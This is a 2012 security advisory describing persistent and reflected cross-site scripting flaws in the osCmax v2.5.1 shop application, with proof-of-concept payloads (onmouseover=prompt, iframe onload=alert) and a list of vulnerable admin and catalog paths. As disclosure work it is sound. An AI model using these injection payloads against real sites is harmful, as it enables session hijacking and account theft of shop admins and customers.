Abstract:
=========
The Vulnerability Laboratory Researcher Team discovered multiple Web Vulnerabilities on the osCmax v2.5.1 shop web application.


Report-Timeline:
================
2012-04-08:	Public or Non-Public Disclosure


Status:
========
Published


Exploitation-Technique:
=======================
Remote


Severity:
=========
Medium


Details:
========
1.1
Multiple persistent input validation vulnerabilities are detected on the osCmax v2.5.1 shop web application.
The bugs allow remote attackers to implement/inject malicious script code on the application side (persistent).
Successful exploitation of the vulnerability can lead to session hijacking (manager/admin) or stable (persistent) 
context manipulation. Exploitation requires low user inter action.


Vulnerable Module(s):
				[+] Register Form - Input Fields & Login Username Display
				[+] Contacts Us - Send Input Fields & Admin output Display
				[+] Add Groups Name - Control Panel

1.2
Multiple non persistent cross site scripting vulnerabilities are detected on the osCmax v2.5.1 shop web application.
The vulnerability allows remote attackers to hijack website customer, moderator or admin sessions with medium required 
user inter action or local low privileged user account. Successful exploitation can result in account steal, phishing 
& client-side content request manipulation.


Vulnerable Module(s):
				[+] Advanced Search
				[+] Advanced Search Results
				[+] Catalog Products with Images
				[+] Contact Us Value
				[+] Index
				[+] Information
				[+] Shopping Cart
				[+] Wishlist & Wishlist Help
				[+] Index - Query

Proof of Concept:
=================
1.1
Review: Register & Contact us

URL encoded POST input name was set to " onmouseover=prompt(vulnerabilitylab) evil="
The input is reflected inside of a tag element between double quotes. The issue can be exploited by including 
malcious script code via contact or register. 


Review: Add Groups
URL: 


       <td><table border="0" cellpadding="0" cellspacing="0" width="100%">
          <tbody><tr>
            <td valign="top"><table border="0" cellpadding="2" cellspacing="0" width="100%">
               <tbody><tr class="dataTableHeadingRow">
           <td class="dataTableHeadingContent"><a href="/oscmax/admin/customers_groups.php?listing=group"><img 
src="includes/languages/german/images/buttons/ic_up.gif" alt="Sortieren Name --> A-B-C Aufsteigend" title=" 
Sortieren Name --> A-B-C Aufsteigend " border="0"></a> <a href="/oscmax/admin/customers_groups.php?listing=group-desc">
<img src="includes/languages/german/images/buttons/ic_down.gif" alt="Sortieren Name --> Z-Y-X Absteigend" 
title=" Sortieren Name --> Z-Y-X Absteigend " border="0"></a><br>Name</td>
                   <td class="dataTableHeadingContent" align="right" valign="bottom">Aktion </td>
               </tr>
 <tr style="" class="dataTableRowSelected" onmouseover="this.style.cursor='hand'" onclick="document.location.href='
http://xxx.com/oscmax/admin/customers_groups.php?listing="=&><iframe_src=a onload=alert(&VULNERABILITYLAB=&)_
<=&page=1&cID=0&action=edit'">
                <td class="dataTableContent">"><iframe src="a" onload='alert("VULNERABILITYLAB</td'>
                <td class="dataTableContent" align="right"><img src="images/icons/icon_arrow_right.gif" 
border="0" alt=""> </td>
              </tr>
          <tr class="dataTableRow" onmouseover="this.className='dataTableRowOver';this.style.cursor='hand'" 
onmouseout="this.className='dataTableRow'" onclick="document.location.href='http://xxx.com/oscmax/admin/customers_groups.php?
listing="=&><iframe_src=a onload=alert(&VULNERABILITYLAB=&)_<=&page=1&cID=1'">
                <td class="dataTableContent">Wholesale</td>
                <td class="dataTableContent" align="right"><a href="http://xxx.com/oscmax/admin/customers_groups.php?
listing="=&><iframe_src=a onload=alert(&VULNERABILITYLAB=&)_<=&page=1&cID=1"><img src="
images/icons/information.png" border="0" alt="Info" title=" Info "></a> </td>
              </tr>
              <tr>


A later effect is also that a group is getting unparsed displayed on katalog add article function.
On all add of articles the groups will be displayed and executed out of the shopping application admin context.

              <div id="qpbpp" class="cgtabs ui-tabs ui-widget ui-widget-content ui-corner-all">
                <ul class="tabnav ui-tabs-nav ui-helper-reset ui-helper-clearfix ui-widget-header ui-corner-all">   
<li class="ui-state-default ui-corner-top ui-tabs-selected ui-state-active"><a href="#pricebreak-0">
<iframe src="http://vuln-lab.com"></a></li>
  <li><a href="#pricebreak-1">Wholesale</a></li>
                </ul>

Note: It looks like all name input fields & add masks (katalog, vouchur, carts) are vulnerable to that issue.




1.2
The client side cross site scripting vulnerabilities can be exploited by remote attackers with medium required user inter action.
For demonstration or reproduce ...

All the following site of the application are vulnerable to client side cross site scripting. 

/oscmax/index.php?query=[Cross Site Scripting]
/oscmax/advanced_search.php/*[Cross Site Scripting]
/oscmax/advanced_search_result.php/*[Cross Site Scripting]
/oscmax/catalog_products_with_images.php/*[Cross Site Scripting]
/oscmax/contact_us.php/*[Cross Site Scripting]
/oscmax/index.php/*[Cross Site Scripting]
/oscmax/information.php/*[Cross Site Scripting]
/oscmax/shopping_cart.php/*[Cross Site Scripting]
/oscmax/wishlist.php/*[Cross Site Scripting]
/oscmax/wishlist_help.php/*[Cross Site Scripting]
/oscmax/create_account.php/*[Cross Site Scripting]

Risk:
=====
1.1
The security risk of the persistent (application side) input validation vulnerabilities are estimated as medium.

1.2
The security risk of the non persistent (client side) cross site scripting vulnerabilities are estimated as low(+).
